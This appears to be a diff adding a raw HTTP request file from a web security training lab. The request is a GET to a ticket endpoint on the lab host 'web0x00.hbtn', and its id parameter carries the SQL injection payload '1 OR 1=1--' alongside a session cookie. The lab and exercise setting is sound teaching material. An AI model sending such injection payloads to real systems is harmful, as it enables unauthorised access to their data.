@@ -1,0 +1,7 @@
+GET /support/ticket?id=1%20OR%201=1-- HTTP/1.1
+Host: web0x00.hbtn
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Referer: http://web0x00.hbtn/home
+Cookie: session=.eJxFyksKgCAURuG9_GMJmzoqWkIrULyR4AuvUhDtPaGBw_NxHqw2uMhQh_ZMAlvjmgKVIXvLOZXaoZbWm4J2Hgr8-3KRkbeU02lqhICzULNAYypRBxoj3g8vsSW4.aWpCCQ.FhyGlMQModjta7xry1UDePGXgtM
+Connection: close
